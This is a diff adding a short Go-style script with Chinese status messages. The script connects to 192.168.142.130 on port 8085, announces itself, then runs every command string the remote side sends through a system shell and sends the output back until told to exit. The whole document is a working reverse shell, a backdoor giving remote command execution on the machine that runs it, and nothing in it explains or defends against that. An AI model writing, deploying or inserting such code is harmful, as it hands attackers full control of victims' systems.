@@ -1,0 +1,29 @@
+conn, err := tcp.Connect("192.168.142.130", 8085)
+if err != nil {
+    die(err)
+}
+defer conn.Close()
+
+conn.Send("客户端就绪")
+
+for {
+    cmd, err := conn.RecvStringTimeout(20)
+    if  err == nil {
+        if cmd == "exit" {
+            println("服务端要求关闭连接")
+            break
+        }
+    if cmd != ""{
+        raw, err := exec.System(cmd)
+        if  err == nil {
+            conn.Send("[成功] " + string(raw))
+        } else {
+            conn.Send("[失败] " + err.Error())
+        }
+    }
+    } else {
+        continue
+    }
+}
+
+println("客户端正常退出")
